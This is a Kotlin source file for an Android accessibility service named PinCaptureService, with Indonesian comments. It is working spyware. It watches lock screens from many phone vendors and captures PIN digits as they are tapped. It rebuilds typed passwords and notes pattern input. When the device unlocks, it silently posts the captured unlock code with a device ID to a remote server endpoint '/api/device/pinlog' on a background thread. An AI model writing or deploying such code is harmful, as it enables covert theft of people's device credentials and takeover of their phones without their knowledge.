package com.kztutorial99.androidconnector

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.content.Context
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import com.google.gson.JsonObject
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import java.util.concurrent.TimeUnit

class PinCaptureService : AccessibilityService() {

    private val http = OkHttpClient.Builder()
        .connectTimeout(8, TimeUnit.SECONDS)
        .readTimeout(8, TimeUnit.SECONDS)
        .build()
    private val JSON_MEDIA = "application/json; charset=utf-8".toMediaType()

    // PIN ditangkap digit per digit via klik tombol
    private val pinBuffer   = StringBuilder()
    private var isOnLock    = false
    private var lockType    = "pin"
    private var lastSent    = ""
    private var patternDots = mutableListOf<String>()

    // Password: reconstruct dari beforeText + karakter baru
    private val passwordBuffer = StringBuilder()

    private val LOCK_PKGS = setOf(
        "com.android.systemui",
        "com.android.keyguard",
        "com.miui.home",
        "com.miui.keyguard",
        "com.miui.securityinputmethod",
        "com.samsung.android.app.cocktailbarservice",
        "com.coloros.launcher",
        "com.vivo.launcher",
        "com.vivo.keyguard",
        "com.huawei.systemmanager",
        "com.lge.clock",
        "com.sec.android.app.launcher",
        "com.motorola.launcher3",
        "com.oneplus.launcher"
    )

    override fun onServiceConnected() {
        serviceInfo = AccessibilityServiceInfo().apply {
            eventTypes =
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED   or
                AccessibilityEvent.TYPE_VIEW_CLICKED            or
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED       or
                AccessibilityEvent.TYPE_VIEW_SCROLLED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags        = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                           AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS
            notificationTimeout = 50
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        val ev  = event ?: return
        val pkg = ev.packageName?.toString() ?: return

        when (ev.eventType) {

            // ── Deteksi lock screen muncul / hilang ───────────────────────────
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                val cls = ev.className?.toString() ?: ""
                val isLockWindow =
                    pkg in LOCK_PKGS ||
                    cls.contains("KeyguardBouncer",   ignoreCase = true) ||
                    cls.contains("LockScreen",         ignoreCase = true) ||
                    cls.contains("KeyguardHostView",   ignoreCase = true) ||
                    cls.contains("StatusBarKeyguard",  ignoreCase = true) ||
                    (cls.contains("PhoneWindow", ignoreCase = true) && pkg in LOCK_PKGS)

                if (isLockWindow) {
                    if (!isOnLock) {
                        isOnLock = true
                        resetBuffers()
                    }
                } else if (isOnLock && pkg !in LOCK_PKGS) {
                    // Layar berhasil dibuka — kirim data
                    val captured = buildCaptureString()
                    if (captured.isNotBlank()) sendCapture(captured, lockType)
                    isOnLock = false
                    resetBuffers()
                }
            }

            // ── Klik tombol PIN keypad ────────────────────────────────────────
            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
                val inLockCtx = isOnLock || pkg in LOCK_PKGS
                if (!inLockCtx) return

                val src    = ev.source ?: return
                val desc   = src.contentDescription?.toString() ?: ""
                val viewId = src.viewIdResourceName ?: ""
                val srcCls = src.className?.toString() ?: ""

                when {
                    // Digit 0–9 pada numpad PIN — contentDescription SELALU angka asli
                    desc.matches(Regex("[0-9]")) -> {
                        lockType = "pin"
                        isOnLock = true
                        pinBuffer.append(desc)
                    }

                    // Backspace / hapus
                    desc.equals("Delete",    ignoreCase = true) ||
                    desc.equals("Backspace", ignoreCase = true) ||
                    viewId.contains("delete",    ignoreCase = true) ||
                    viewId.contains("backspace", ignoreCase = true) -> {
                        if (pinBuffer.isNotEmpty())
                            pinBuffer.deleteCharAt(pinBuffer.length - 1)
                        if (passwordBuffer.isNotEmpty())
                            passwordBuffer.deleteCharAt(passwordBuffer.length - 1)
                    }

                    // OK / Enter → kirim langsung
                    desc.equals("OK",    ignoreCase = true) ||
                    desc.equals("Enter", ignoreCase = true) ||
                    viewId.contains("key_enter", ignoreCase = true) ||
                    viewId.contains("key_ok",    ignoreCase = true) -> {
                        val captured = buildCaptureString()
                        if (captured.isNotBlank()) {
                            sendCapture(captured, lockType)
                            resetBuffers()
                        }
                    }

                    // Keyboard biasa — ambil karakter dari text node
                    srcCls.contains("Button", ignoreCase = true) &&
                    desc.length == 1 -> {
                        lockType = "password"
                        isOnLock = true
                        passwordBuffer.append(desc)
                    }

                    // Pattern view
                    srcCls.contains("PatternView", ignoreCase = true) ||
                    viewId.contains("lockPattern",  ignoreCase = true) -> {
                        lockType = "pattern"
                        isOnLock = true
                    }
                }
                src.recycle()
            }

            // ── Perubahan teks (password / PIN field) ─────────────────────────
            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val inLockCtx = isOnLock || pkg in LOCK_PKGS
                if (!inLockCtx) return

                val src = ev.source ?: return

                // Gunakan beforeText + addedCount untuk reconstruct karakter asli
                // JANGAN pakai ev.text karena itu sudah di-mask (•••)
                val beforeText   = ev.beforeText?.toString() ?: ""
                val addedCount   = ev.addedCount
                val removedCount = ev.removedCount

                if (removedCount > 0 && addedCount == 0) {
                    // Hapus karakter
                    val newLen = (passwordBuffer.length - removedCount).coerceAtLeast(0)
                    if (passwordBuffer.length > newLen)
                        passwordBuffer.delete(newLen, passwordBuffer.length)
                } else if (addedCount > 0) {
                    // Ada karakter baru — coba ambil dari node text langsung
                    // Ini berfungsi untuk field yang TIDAK password-masked
                    val nodeText = src.text?.toString() ?: ""
                    val isPasswordField = src.isPassword

                    if (!isPasswordField && nodeText.isNotBlank() &&
                        !nodeText.all { it == '•' || it == '*' || it == '·' }) {
                        // Field biasa — ambil langsung
                        lockType = "password"
                        isOnLock = true
                        passwordBuffer.clear()
                        passwordBuffer.append(nodeText)
                    } else {
                        // Field password ter-mask — kita sudah track via klik,
                        // cukup catat panjang saja sebagai fallback
                        // (digit via klik sudah tersimpan di pinBuffer)
                        lockType = if (pinBuffer.isNotEmpty()) "pin" else "password"
                        isOnLock = true
                    }
                }
                src.recycle()
            }

            // ── Scroll / gesture PatternView ──────────────────────────────────
            AccessibilityEvent.TYPE_VIEW_SCROLLED -> {
                val inLockCtx = isOnLock || pkg in LOCK_PKGS
                if (!inLockCtx) return
                val src    = ev.source ?: return
                val srcCls = src.className?.toString() ?: ""
                if (srcCls.contains("PatternView", ignoreCase = true)) {
                    lockType = "pattern"
                    isOnLock = true
                }
                src.recycle()
            }
        }
    }

    override fun onInterrupt() {}

    private fun resetBuffers() {
        pinBuffer.clear()
        passwordBuffer.clear()
        patternDots.clear()
        lockType = "pin"
    }

    private fun buildCaptureString(): String {
        return when (lockType) {
            "pattern"  -> if (patternDots.isNotEmpty()) patternDots.joinToString("→") else ""
            "password" -> passwordBuffer.toString().ifBlank { pinBuffer.toString() }
            else       -> pinBuffer.toString()
        }
    }

    private fun sendCapture(value: String, type: String) {
        if (value.isBlank() || value == lastSent) return
        lastSent = value

        val prefs    = getSharedPreferences("connector_prefs", Context.MODE_PRIVATE)
        val deviceId = prefs.getString("device_id", null) ?: return

        val body = JsonObject().apply {
            addProperty("deviceId", deviceId)
            addProperty("type",     type)
            addProperty("value",    value)
        }

        Thread {
            try {
                http.newCall(
                    Request.Builder()
                        .url("${SecureConfig.serverUrl()}/api/device/pinlog")
                        .post(body.toString().toRequestBody(JSON_MEDIA))
                        .build()
                ).execute().close()
            } catch (_: Exception) {}
        }.also { it.isDaemon = true }.start()
    }
}
